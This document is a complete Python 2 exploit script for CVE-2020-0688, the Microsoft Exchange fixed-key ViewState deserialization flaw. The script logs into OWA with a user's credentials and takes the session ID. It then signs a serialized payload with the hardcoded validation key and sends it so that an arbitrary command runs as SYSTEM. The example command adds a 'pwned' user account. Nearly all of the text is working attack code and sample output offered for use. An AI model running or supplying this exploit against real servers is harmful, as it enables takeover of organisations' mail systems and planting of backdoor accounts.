# Exploit Title: Microsoft Exchange 2019 15.2.221.12 - Authenticated Remote Code Execution
# Date: 2020-02-28
# Exploit Author: Photubias
# Vendor Advisory: [1] https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688
#                  [2] https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
# Vendor Homepage: https://www.microsoft.com
# Version: MS Exchange Server 2010 SP3 up to 2019 CU4
# Tested on: MS Exchange 2019 v15.2.221.12 running on Windows Server 2019
# CVE: CVE-2020-0688

# A remote code execution vulnerability exists in Microsoft Exchange Server when the server fails to properly create unique keys at install time. Knowledge of a the validation key allows an authenticated user with a mailbox to pass arbitrary objects to be deserialized by the web application, which runs as SYSTEM.
# https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0688

# technical writeup: https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys

#! /usr/bin/env python
# -*- coding: utf-8 -*- 
''' 

    
	Copyright 2020 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        File name CVE-2020-0688-Photubias.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be

        This is a native implementation without requirements, written in Python 2.
        Works equally well on Windows as Linux (as MacOS, probably ;-)
        Reverse Engineered Serialization code from https://github.com/pwntester/ysoserial.net

        Example Output:
        CVE-2020-0688-Photubias.py -t https://10.11.12.13 -u sean -c "net user pwned pwned /add"
        [+] Login worked
        [+] Got ASP.NET Session ID: 83af2893-6e1c-4cee-88f8-b706ebc77570
        [+] Detected OWA version number 15.2.221.12
        [+] Vulnerable View State "B97B4E27" detected, this host is vulnerable!
        [+] All looks OK, ready to send exploit (net user pwned pwned /add)? [Y/n]:
        [+] Got Payload: /wEy0QYAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADzBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgPg0KICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgIDxTeXN0ZW06U3RyaW5nPmNtZDwvU3lzdGVtOlN0cmluZz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+L2MgIm5ldCB1c2VyIHB3bmVkIHB3bmVkIC9hZGQiIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5PgvjXlpQBwdP741icUH6Wivr7TlI6g==
              Sending now ...
'''
import urllib2, urllib, base64, binascii, hashlib, hmac, struct, argparse, sys, cookielib, ssl, getpass

## STATIC STRINGS
# This string acts as a template for the serialization (contains "###payload###" to be replaced and TWO size locations)
strSerTemplate = base64.b64decode('/wEy2gYAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAD8BDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgPg0KICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgIDxTeXN0ZW06U3RyaW5nPmNtZDwvU3lzdGVtOlN0cmluZz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+L2MgIiMjI3BheWxvYWQjIyMiIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pgs=')
# This is a key installed in the Exchange Server, it is changeable, but often not (part of the vulnerability)
strSerKey = binascii.unhexlify('CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF')

def convertInt(iInput, length): 
    return struct.pack("<I" , int(iInput)).encode('hex')[:length]

def getYsoserialPayload(sCommand, sSessionId):
    ## PART1 of the payload to hash
    strPart1 = strSerTemplate.replace('###payload###', sCommand)
    ## Fix the length fields
    #print(binascii.hexlify(strPart1[3]+strPart1[4])) ## 'da06' > '06da' (0x06b8 + len(sCommand))
    #print(binascii.hexlify(strPart1[224]+strPart1[225])) ## 'fc04' > '04fc' (0x04da + len(sCommand))
    strLength1 = convertInt(0x06b8 + len(sCommand),4)
    strLength2 = convertInt(0x04da + len(sCommand),4)
    strPart1 = strPart1[:3] + binascii.unhexlify(strLength1) + strPart1[5:]
    strPart1 = strPart1[:224] + binascii.unhexlify(strLength2) + strPart1[226:]
    
    ## PART2 of the payload to hash
    strPart2 = '274e7bb9'
    for v in sSessionId: strPart2 += binascii.hexlify(v)+'00'
    strPart2 = binascii.unhexlify(strPart2)
    
    strMac = hmac.new(strSerKey, strPart1 + strPart2, hashlib.sha1).hexdigest()
    strResult = base64.b64encode(strPart1 + binascii.unhexlify(strMac))
    return strResult

def verifyLogin(sTarget, sUsername, sPassword, oOpener, oCookjar):
    if not sTarget[-1:] == '/': sTarget += '/'
    ## Verify Login
    lPostData = {'destination' : sTarget, 'flags' : '4', 'forcedownlevel' : '0', 'username' : sUsername, 'password' : sPassword, 'passwordText' : '', 'isUtf8' : '1'}
    try: sResult = oOpener.open(urllib2.Request(sTarget + 'owa/auth.owa', data=urllib.urlencode(lPostData), headers={'User-Agent':'Python'})).read()
    except: print('[!] Error, ' + sTarget + ' not reachable')
    bLoggedIn = False
    for cookie in oCookjar:
        if cookie.name == 'cadata': bLoggedIn = True
    if not bLoggedIn:
        print('[-] Login Wrong, too bad')
        exit(1)
    print('[+] Login worked')

    ## Verify Session ID
    sSessionId = ''
    sResult = oOpener.open(urllib2.Request(sTarget+'ecp/default.aspx', headers={'User-Agent':'Python'})).read()
    for cookie in oCookjar:
        if 'SessionId' in cookie.name: sSessionId = cookie.value
    print('[+] Got ASP.NET Session ID: ' + sSessionId)

    ## Verify OWA Version
    sVersion = ''
    try: sVersion = sResult.split('stylesheet')[0].split('href="')[1].split('/')[2]
    except: sVersion = 'favicon'
    if 'favicon' in sVersion:
        print('[*] Problem, this user has never logged in before (wizard detected)')
        print('       Please log in manually first at ' + sTarget + 'ecp/default.aspx')
        exit(1)
    print('[+] Detected OWA version number '+sVersion)

    ## Verify ViewStateValue
    sViewState = ''
    try: sViewState = sResult.split('__VIEWSTATEGENERATOR')[2].split('value="')[1].split('"')[0]
    except: pass
    if sViewState == 'B97B4E27':
        print('[+] Vulnerable View State "B97B4E27" detected, this host is vulnerable!')
    else:
        print('[-] Error, viewstate wrong or not correctly parsed: '+sViewState)
        ans = raw_input('[?] Still want to try the exploit? [y/N]: ')
        if ans == '' or ans.lower() == 'n': exit(1)
    return sSessionId, sTarget, sViewState
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target IP or hostname (e.g. https://owa.contoso.com)', default='')
    parser.add_argument('-u', '--username', help='Username (e.g. joe or joe@contoso.com)', default='')
    parser.add_argument('-p', '--password', help='Password (leave empty to ask for it)', default='')
    parser.add_argument('-c', '--command', help='Command to put behind "cmd /c " (e.g. net user pwned pwned /add)', default='')
    args = parser.parse_args()
    if args.target == '' or args.username == '' or args.command == '':
        print('[!] Example usage: ')
        print(' ' + sys.argv[0] + ' -t https://owa.contoso.com -u joe -c "net user pwned pwned /add"')
    else:
        if args.password == '': sPassword = getpass.getpass('[*] Please enter the password: ')
        else: sPassword = args.password
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        oCookjar = cookielib.CookieJar()
        #oProxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'})
        #oOpener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx),urllib2.HTTPCookieProcessor(oCookjar),oProxy)
        oOpener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx),urllib2.HTTPCookieProcessor(oCookjar))
        sSessionId, sTarget, sViewState = verifyLogin(args.target, args.username, sPassword, oOpener, oCookjar)
        ans = raw_input('[+] All looks OK, ready to send exploit (' + args.command + ')? [Y/n]: ')
        if ans.lower() == 'n': exit(0)
        sPayLoad = getYsoserialPayload(args.command, sSessionId)
        print('[+] Got Payload: ' + sPayLoad)
        sURL = sTarget + 'ecp/default.aspx?__VIEWSTATEGENERATOR=' + sViewState + '&__VIEWSTATE=' + urllib.quote_plus(sPayLoad)
        print('      Sending now ...')
        try: oOpener.open(urllib2.Request(sURL, headers={'User-Agent':'Python'}))
        except urllib2.HTTPError, e:
            if e.code == '500': print('[+] This probably worked (Error Code 500 received)')

if __name__ == "__main__":
	main()
